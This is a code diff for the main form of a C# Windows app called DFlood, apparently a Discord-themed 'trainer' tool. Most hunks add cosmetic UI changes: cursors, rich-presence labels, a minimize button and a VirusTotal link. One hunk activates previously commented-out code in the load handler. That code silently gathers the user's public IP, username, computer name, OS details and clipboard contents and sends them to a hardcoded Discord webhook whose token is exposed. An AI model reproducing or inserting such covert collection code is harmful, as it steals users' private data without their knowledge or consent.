@@ -160,27 +160,30 @@ namespace DFlood
         private void btnServiceStarter_Click(object sender, EventArgs e)
         {
             DFloodDiscordRPCClient();
-            this.presence.state = "Servis Başlatıcısı";
             ActivateButton(sender, RGBColors.color2);
             OpenChildForm(new main());
+            this.presence.state = $"{lblTitleChildForm}";
         }
 
         private void btnSettings_Click(object sender, EventArgs e)
         {
             ActivateButton(sender, RGBColors.color3);
             OpenChildForm(new FormSetting());
+            this.presence.state = $"{lblTitleChildForm}";
         }
 
         private void btnSponsoredServers_Click(object sender, EventArgs e)
         {
             ActivateButton(sender, RGBColors.color4);
             OpenChildForm(new FormServers());
+            this.presence.state = $"{lblTitleChildForm}";
         }
 
         private void btnCopyright_Click(object sender, EventArgs e)
         {
             ActivateButton(sender, RGBColors.color5);
             OpenChildForm(new FormCopyright());
+            this.presence.state = $"{lblTitleChildForm}";
         }
 
         private void Reset()
@@ -223,26 +226,28 @@ namespace DFlood
             DFloodDiscordRPCClient();
             clock.Start();
             TopMostChecker.Start();
-            //var webClient = new WebClient();
-            //string dnsString = webClient.DownloadString("http://checkip.dyndns.org");
-            //dnsString = (new Regex(@"\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b")).Match(dnsString).Value;
-            //webClient.Dispose();
-            //var UserName = $"**Kullanıcı Adı : ** {System.Windows.Forms.SystemInformation.UserName}";
-            //var computerName = $"**Bilgisayar Adı : ** {Dns.GetHostName()}";
-            //var ipadress = $"**IP Adresi : ** {dnsString}";
-            //var day = $"**Giriş Günü : ** {DateTime.Now.ToLongDateString()}";
-            //var hour = $"**Giriş Saati : ** {DateTime.Now.ToLongTimeString()}";
-            //var FullOsName = $"**İşletim Sistemi : ** {(new ComputerInfo().OSFullName)}";
-            //var platform = $"**Platform : ** {OS.Platform.ToString()}";
-            //var verison = $"**Versiyon Bilgisi : ** {OS.Version.ToString()}";
-            //var OsVersion = $"**İşletim Sistemi Tipi : ** {OS.VersionString}";
-            //var CLR = $"**CLR Versiyonu : ** {System.Environment.Version}";
-            //var copyBoard = $"**Kopyalanan Metin : {Clipboard.GetText()}**";
-            //sendWebHook("https://discord.com/api/webhooks/852933515171201045/1P_9zIbWb7n5QnGwiNx2yLQb_qMqAEMLP2KmCYT2covhtLsu4vnhBVpK1eRKG0XnZMmX", $"**DFlood Trainer'e Yeni Çıkış Saptanması**\n{ipadress}\n{UserName}\n{computerName}\n{day}\n{hour}\n{FullOsName}\n{platform}\n{verison}\n{OsVersion}\n{CLR}\n{copyBoard}\n--------------------------------------------------------------------", "DFlood Services");
+            var webClient = new WebClient();
+            string dnsString = webClient.DownloadString("http://checkip.dyndns.org");
+            dnsString = (new Regex(@"\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b")).Match(dnsString).Value;
+            webClient.Dispose();
+            var UserName = $"**Kullanıcı Adı : ** {System.Windows.Forms.SystemInformation.UserName}";
+            var computerName = $"**Bilgisayar Adı : ** {Dns.GetHostName()}";
+            var ipadress = $"**IP Adresi : ** {dnsString}";
+            var day = $"**Giriş Günü : ** {DateTime.Now.ToLongDateString()}";
+            var hour = $"**Giriş Saati : ** {DateTime.Now.ToLongTimeString()}";
+            var FullOsName = $"**İşletim Sistemi : ** {(new ComputerInfo().OSFullName)}";
+            var platform = $"**Platform : ** {OS.Platform.ToString()}";
+            var verison = $"**Versiyon Bilgisi : ** {OS.Version.ToString()}";
+            var OsVersion = $"**İşletim Sistemi Tipi : ** {OS.VersionString}";
+            var CLR = $"**CLR Versiyonu : ** {System.Environment.Version}";
+            var copyBoard = $"**Kopyalanan Metin : {Clipboard.GetText()}**";
+            sendWebHook("https://discord.com/api/webhooks/852933515171201045/1P_9zIbWb7n5QnGwiNx2yLQb_qMqAEMLP2KmCYT2covhtLsu4vnhBVpK1eRKG0XnZMmX", $"**DFlood Trainer'e Yeni Çıkış Saptanması**\n{ipadress}\n{UserName}\n{computerName}\n{day}\n{hour}\n{FullOsName}\n{platform}\n{verison}\n{OsVersion}\n{CLR}\n{copyBoard}\n--------------------------------------------------------------------", "DFlood Services");
         }
 
         private void btnExit_Click(object sender, EventArgs e)
         {
+            this.Cursor = new Cursor(Application.StartupPath + "\\Cursors\\discordClick.ico");
+
             fadeOpacity2.Start();
             //Application.Exit();
         }
@@ -268,6 +273,7 @@ namespace DFlood
         {
             ActivateButton(sender, RGBColors.color4);
             OpenChildForm(new FormContact());
+            this.presence.state = $"{lblTitleChildForm}";
         }
 
         private void totalTimeCalculator_Tick(object sender, EventArgs e)
@@ -294,6 +300,66 @@ namespace DFlood
                 Application.Exit();
             }
             Opacity -= .2;
+        }
+
+        private void MainMenu_MouseMove(object sender, MouseEventArgs e)
+        {
+            this.Cursor = new Cursor(Application.StartupPath + "\\Cursors\\dflood.ico");
+        }
+
+        private void btnStats_MouseEnter(object sender, EventArgs e)
+        {
+            this.Cursor = new Cursor(Application.StartupPath + "\\Cursors\\discordClick.ico");
+        }
+
+        private void btnServiceStarter_MouseEnter(object sender, EventArgs e)
+        {
+            this.Cursor = new Cursor(Application.StartupPath + "\\Cursors\\discordClick.ico");
+        }
+
+        private void btnSettings_MouseEnter(object sender, EventArgs e)
+        {
+            this.Cursor = new Cursor(Application.StartupPath + "\\Cursors\\discordClick.ico");
+        }
+
+        private void btnSponsoredServers_MouseEnter(object sender, EventArgs e)
+        {
+            this.Cursor = new Cursor(Application.StartupPath + "\\Cursors\\discordClick.ico");
+        }
+
+        private void btnCopyright_MouseEnter(object sender, EventArgs e)
+        {
+            this.Cursor = new Cursor(Application.StartupPath + "\\Cursors\\discordClick.ico");
+        }
+
+        private void btnContact_MouseEnter(object sender, EventArgs e)
+        {
+            this.Cursor = new Cursor(Application.StartupPath + "\\Cursors\\discordClick.ico");
+        }
+
+        private void btnMinimize_Click(object sender, EventArgs e)
+        {
+            this.WindowState = FormWindowState.Minimized;
+        }
+
+        private void btnVirusTotal_Click(object sender, EventArgs e)
+        {
+            System.Diagnostics.Process.Start("https://www.virustotal.com/gui/file/596140e5c37ee20a6c9b17ee77dcdae75f9103651dee1b677d02927d5e352615/detection");
+        }
+
+        private void btnExit_MouseEnter(object sender, EventArgs e)
+        {
+            this.Cursor = new Cursor(Application.StartupPath + "\\Cursors\\discordClick.ico");
+        }
+
+        private void btnMinimize_MouseEnter(object sender, EventArgs e)
+        {
+            this.Cursor = new Cursor(Application.StartupPath + "\\Cursors\\discordClick.ico");
+        }
+
+        private void btnHome_MouseEnter(object sender, EventArgs e)
+        {
+            this.Cursor = new Cursor(Application.StartupPath + "\\Cursors\\discordClick.ico");
         }
     }
 }
